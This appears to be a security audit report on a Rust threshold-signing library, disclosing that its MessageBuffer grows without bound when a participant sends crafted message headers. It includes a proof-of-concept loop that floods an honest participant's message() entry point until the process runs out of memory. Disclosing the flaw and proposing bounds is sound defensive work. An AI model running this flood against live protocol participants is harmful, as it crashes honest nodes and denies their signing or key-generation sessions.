### Title
Unbounded `MessageBuffer` Growth via Attacker-Crafted Message Headers Enables Memory Exhaustion — (`File: src/protocol/internal.rs`)

---

### Summary

The `MessageBuffer` in `src/protocol/internal.rs` accepts and stores every inbound message keyed by its raw `MessageHeader` bytes, with no cap on the number of distinct headers or messages per header. A malicious participant can call `Protocol::message()` with crafted byte payloads containing arbitrary headers, causing the internal `HashMap<MessageHeader, SubMessageQueue>` to grow without bound. The codebase itself contains a test that explicitly confirms this attack succeeds.

---

### Finding Description

Every protocol participant exposes a `message()` entry point defined in the `Protocol` trait:

```rust
// src/protocol/mod.rs:64
fn message(&mut self, from: Participant, data: MessageData);
```

The implementation in `ProtocolExecutor` forwards every call directly to `comms.push_message(from, data)`:

```rust
// src/protocol/internal.rs:512-514
fn message(&mut self, from: Participant, data: MessageData) {
    self.comms.push_message(from, data);
}
```

`push_message` parses the first 40 bytes of the raw payload as a `MessageHeader` (32-byte `ChannelTag` + 8-byte `Waitpoint`) and inserts it into the buffer with no validation against any set of expected headers:

```rust
// src/protocol/internal.rs:286-296
fn push_message(&self, from: Participant, message: MessageData) {
    if message.len() < MessageHeader::LEN { return; }
    let Some(header) = MessageHeader::from_bytes(&message) else { return; };
    self.incoming.push(header, from, message);
}
```

`MessageBuffer::push` inserts a new `HashMap` entry for every previously-unseen header:

```rust
// src/protocol/internal.rs:236-239
fn push(&self, header: MessageHeader, from: Participant, message: MessageData) {
    let mut messages_lock = self.messages.lock().expect("lock should not fail");
    messages_lock.entry(header).or_default().send(from, message);
}
```

The backing store is an unbounded `HashMap<MessageHeader, SubMessageQueue>`:

```rust
// src/protocol/internal.rs:222-224
struct MessageBuffer {
    messages: Arc<std::sync::Mutex<HashMap<MessageHeader, SubMessageQueue>>>,
}
```

Each `SubMessageQueue` is itself backed by an `unbounded` MPSC channel:

```rust
// src/protocol/internal.rs:204-212
impl Default for SubMessageQueue {
    fn default() -> Self {
        let (sender, receiver) = futures::channel::mpsc::unbounded();
        ...
    }
}
```

There are therefore two independent unbounded growth axes:
1. **HashMap entries** — one per unique 40-byte header prefix; an attacker varying any bit of the channel tag or waitpoint creates a new entry.
2. **Queue depth** — messages sharing the same header accumulate without limit inside the unbounded MPSC channel.

The codebase itself contains a test that explicitly confirms the attack:

```rust
// src/protocol/internal.rs:532-553
fn attacker_can_fill_message_buffer_with_unused_waitpoints() {
    let comms = Comms::new();
    let attacker = Participant::from(99_u32);
    let attack_count = 512_u64;
    for i in 0..attack_count {
        let header = MessageHeader::new(ChannelTag::root_shared()).with_waitpoint(1_000_000 + i);
        let mut message = header.to_bytes().to_vec();
        message.extend_from_slice(&i.to_le_bytes());
        comms.push_message(attacker, message);
    }
    // Confirms all 512 entries are stored
    assert!(messages.len() == usize::try_from(attack_count).unwrap());
}
```

The test is named `attacker_can_fill_message_buffer_with_unused_waitpoints` and asserts the attack succeeds — it is a demonstration of the vulnerability, not a regression guard against it.

---

### Impact Explanation

A malicious participant in any protocol session (DKG, reshare, refresh, presign, sign, CKD) can send an unbounded stream of messages with distinct fabricated headers to an honest participant's `Protocol::message()` entry point. Each unique header allocates a new `HashMap` entry plus a new `SubMessageQueue` (heap-allocated MPSC channel). Sustained injection causes the honest participant's process to exhaust available memory and crash, permanently denying that participant's ability to complete the current signing, key generation, reshare, refresh, or CKD session.

This matches: **Medium — Griefing or resource-exhaustion by a malicious participant causing unbounded memory growth beyond documented behavior.**

---

### Likelihood Explanation

The `Protocol::message()` function is the standard, documented API surface for delivering network messages to a participant. Any co-participant in a threshold session can send arbitrary byte payloads over the network; the library provides no authentication or size/count enforcement at the `message()` boundary. The attack requires only the ability to send messages — no cryptographic material, no special privilege, and no coordination with other parties. The attack is trivially automatable and scales linearly with available network bandwidth.

---

### Recommendation

Enforce a capacity bound on the `MessageBuffer` at both dimensions:

1. **Cap the number of distinct `MessageHeader` keys** in the `HashMap` to a protocol-derived maximum (e.g., `num_participants × num_rounds × num_channels`). Reject or drop messages that would exceed this cap.
2. **Replace `futures::channel::mpsc::unbounded()` with a bounded channel** (e.g., `futures::channel::mpsc::channel(MAX_QUEUE_DEPTH)`) so that per-header queue depth is also limited.
3. Optionally, validate incoming headers against the set of headers the local participant actually expects at the current protocol stage, discarding anything outside that set.

---

### Proof of Concept

The existing test in the repository at `src/protocol/internal.rs:532` already serves as a proof of concept. To extend it to an OOM scenario, a caller would loop without the fixed `attack_count` bound:

```rust
// Malicious participant floods an honest participant's message buffer
let honest_protocol: Box<dyn Protocol<Output = _>> = /* any DKG/sign/presign protocol */;
let attacker = Participant::from(99_u32);

let mut i: u64 = 0;
loop {
    // Each iteration uses a distinct waitpoint, creating a new HashMap entry
    let header = MessageHeader::new(ChannelTag::root_shared()).with_waitpoint(i);
    let mut message = header.to_bytes().to_vec();
    message.extend_from_slice(b"spam");
    // This is the public Protocol trait entry point
    honest_protocol.message(attacker, message);
    i += 1;
    // HashMap grows by one entry per iteration; process OOMs and crashes
}
```

Each call to `message()` inserts a new entry into the unbounded `HashMap` inside `MessageBuffer`, consuming heap memory proportional to `i` with no upper bound enforced anywhere in `src/protocol/internal.rs`. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** src/protocol/internal.rs (L204-212)
```rust
impl Default for SubMessageQueue {
    fn default() -> Self {
        let (sender, receiver) = futures::channel::mpsc::unbounded();
        Self {
            sender,
            receiver: Arc::new(Mutex::new(receiver)),
        }
    }
}
```

**File:** src/protocol/internal.rs (L222-239)
```rust
struct MessageBuffer {
    messages: Arc<std::sync::Mutex<HashMap<MessageHeader, SubMessageQueue>>>,
}

impl MessageBuffer {
    fn new() -> Self {
        Self {
            messages: Arc::new(std::sync::Mutex::new(HashMap::new())),
        }
    }

    /// Push a message into this buffer.
    ///
    /// We also need the header for the message, and the participant who sent it.
    fn push(&self, header: MessageHeader, from: Participant, message: MessageData) {
        let mut messages_lock = self.messages.lock().expect("lock should not fail");
        messages_lock.entry(header).or_default().send(from, message);
    }
```

**File:** src/protocol/internal.rs (L286-296)
```rust
    fn push_message(&self, from: Participant, message: MessageData) {
        if message.len() < MessageHeader::LEN {
            return;
        }

        let Some(header) = MessageHeader::from_bytes(&message) else {
            return;
        };

        self.incoming.push(header, from, message);
    }
```

**File:** src/protocol/internal.rs (L512-514)
```rust
    fn message(&mut self, from: Participant, data: MessageData) {
        self.comms.push_message(from, data);
    }
```

**File:** src/protocol/internal.rs (L532-554)
```rust
    fn attacker_can_fill_message_buffer_with_unused_waitpoints() {
        let comms = Comms::new();
        let attacker = Participant::from(99_u32);
        let attack_count = 512_u64;

        for i in 0..attack_count {
            let header =
                MessageHeader::new(ChannelTag::root_shared()).with_waitpoint(1_000_000 + i);
            let mut message = header.to_bytes().to_vec();
            message.extend_from_slice(&i.to_le_bytes());

            // Attacker injects messages for waitpoints the honest code never polls.
            comms.push_message(attacker, message);
        }

        let messages = comms
            .incoming
            .messages
            .lock()
            .expect("lock should not fail");

        assert!(messages.len() == usize::try_from(attack_count).unwrap());
    }
```

**File:** src/protocol/mod.rs (L63-64)
```rust
    /// Inform the protocol of a new message.
    fn message(&mut self, from: Participant, data: MessageData);
```
